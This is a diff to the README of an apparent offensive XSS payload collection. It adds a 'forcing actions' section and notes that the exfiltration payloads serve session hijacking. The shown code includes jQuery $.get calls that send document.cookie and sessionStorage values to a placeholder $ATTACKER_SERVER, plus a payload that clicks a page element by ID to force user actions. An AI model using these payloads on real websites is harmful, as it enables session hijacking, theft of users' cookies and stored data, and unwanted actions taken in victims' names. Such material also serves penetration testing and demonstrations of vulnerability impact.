@@ -4,12 +4,13 @@ Instead of using alert() for your XSS payloads, I encourage you to check out som
 + **TLDR:** *POC||GTFO*
 
 ### **Quick-navigation:**
-+ Exfiltration:  
++ **EXFILTRATION:**  
   + [Fetch](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
   + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
-
++ **ACTIONS:**
 
 # EXFILTRATION
+*For session hijacking, sensitive info exfil, etc.*
 ## FETCH
 ### GET VALUE FROM LOCAL STORAGE AND $FETCH:
 ```javascript
@@ -35,4 +36,10 @@ $.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCA
 ### GET COOKIES AND $.GET
 ```javascript
 $.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
+```  
+# FORCING ACTIONS
+*For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
+## CLICK ELEMENT BY ID
+```javascript
+document.getElementById("$TARGET_ELEMENT_ID").click()
 ```
